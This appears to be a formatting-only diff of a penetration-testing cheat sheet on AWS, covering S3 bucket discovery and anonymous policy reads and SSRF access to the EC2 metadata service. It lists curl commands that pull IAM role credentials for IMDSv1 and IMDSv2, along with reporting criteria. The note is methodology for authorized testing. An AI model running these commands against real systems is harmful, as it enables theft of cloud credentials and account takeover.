@@ -20,6 +20,7 @@ Tools: [cloudsplaining](https://github.com/salesforce/cloudsplaining), [pacu](ht
 ## S3
 
 Discovery:
+
 ```bash
 # Subdomain enum surfaces S3 via CNAME
 dig target.s3.amazonaws.com
@@ -36,6 +37,7 @@ aws s3api get-bucket-policy --bucket target-backup --no-sign-request
 ```
 
 Findings:
+
 - Public `READ` → info disclosure.
 - Public `WRITE` → defacement, malware hosting.
 - Public `READ_ACP`/`WRITE_ACP` → privilege escalation to full control.
@@ -44,12 +46,14 @@ Findings:
 ## SSRF → IMDS
 
 IMDSv1 (legacy):
+
 ```bash
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
 ```
 
 IMDSv2 (session token required):
+
 ```bash
 TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
   -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
@@ -58,6 +62,7 @@ curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
 ```
 
 Report as high when:
+
 - SSRF reaches metadata
 - Returns creds (`AccessKeyId`, `SecretAccessKey`, `Token`)
 - Creds valid (`aws sts get-caller-identity` confirms)
